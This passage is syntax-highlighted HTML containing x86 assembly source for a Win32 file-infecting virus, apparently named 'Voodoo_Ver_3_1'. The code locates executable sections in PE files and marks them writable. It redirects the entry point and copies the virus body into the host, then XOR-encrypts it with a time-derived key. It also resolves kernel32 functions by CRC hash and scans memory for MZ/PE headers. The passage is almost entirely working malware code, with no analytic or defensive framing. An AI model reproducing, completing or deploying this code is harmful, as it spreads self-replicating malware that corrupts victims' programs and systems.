         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EDI=Name RVA</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">KERNEL_HET</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; EAX= Phis offset</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Pointer2MapFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'NREK'</span><span class="sc1">;KERNEL</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">KERNEL_ECT</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ECTLI_KERNEL</span><span class="sc0">
</span><span class="sc5">KERNEL_HET</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Not_Find</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Code_Not_Find</span><span class="sc0">
</span><span class="sc5">KERNEL_ECT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc5">_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0"> </span><span class="sc1">;mov eax,dword [edi+024h]</span><span class="sc0">
         </span><span class="sc5">EXEC_FLAG</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20000020h</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EXEC_FLAG</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Code_Object</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">_loop</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Code_Not_Find</span><span class="sc0">
</span><span class="sc5">Code_Object</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc1">;chek object size</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc5">VirSize</span><span class="sc0">
          </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">Code_Not_Find</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systemtime</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6fh</span><span class="sc4">],</span><span class="sc2">334e4957h</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc1">; make writeble</span><span class="sc0">
          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;object RVA</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@EntryPointRVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set New Entry Point RVA</span><span class="sc0">
          </span><span class="sc1">; save old Programm</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseMapping</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">tag</span><span class="sc4">],</span><span class="sc2">06666h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Point@ret</span><span class="sc0">
  </span><span class="sc5">OkOb</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">tag</span><span class="sc4">],</span><span class="sc2">09999h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;phisical offset</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc1">;add esi,edx</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Pointer2MapFile</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">;CODE</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc1">;write bady to program</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; CODE</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">systemtime</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">systemtime</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">CRCcode</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; ?</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">INCAX</span><span class="sc4">],</span><span class="sc2">0e2c10366h</span><span class="sc0"> </span><span class="sc1">;inc ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">INCAX2</span><span class="sc4">],</span><span class="sc2">0e2c10366h</span><span class="sc0"> </span><span class="sc1">;inc ax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">popravka2</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CryptBegin2</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypt_2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt_2</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">popravka</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CryptBegin</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc1">;2eh+6</span><span class="sc0">
</span><span class="sc5">crypt_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt_</span><span class="sc0">

</span><span class="sc5">Code_Not_Find</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">OOO2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseMapping</span><span class="sc0">
</span><span class="sc5">Error__2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PushWin32FindData</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">files</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">
</span><span class="sc5">@AV</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OOO</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">9999h</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">OOO2</span><span class="sc0">
</span><span class="sc5">Error__</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">9999h</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Error__2</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CalkProcAdress</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">@Name_Pointers_RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">fCRC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ScanNameTable</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">foCRC</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fCRC</span><span class="sc0">
</span><span class="sc5">foCRC</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@KernelHandle</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@GetProcAddress</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ScanNameTable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRCSum</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CRCSum</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Sum</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitfromCRCSum</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Sum</span><span class="sc0">
</span><span class="sc5">ExitfromCRCSum</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ScanMZ</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;  \/</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1111000000000000b</span><span class="sc0">
</span><span class="sc5">ScanMZ_</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ScanMZ_</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">00010000h</span><span class="sc0">
   </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">NextMZ</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">004550h</span><span class="sc0">
</span><span class="sc5">NextMZ</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ScanMZ_</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---Local ----------</span><span class="sc0">
</span><span class="sc5">CloseMapping</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Pointer2MapFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">HhendleOfMapFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">LoadMemPointer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@MemPointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----Import---------</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_GetFileSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc0">
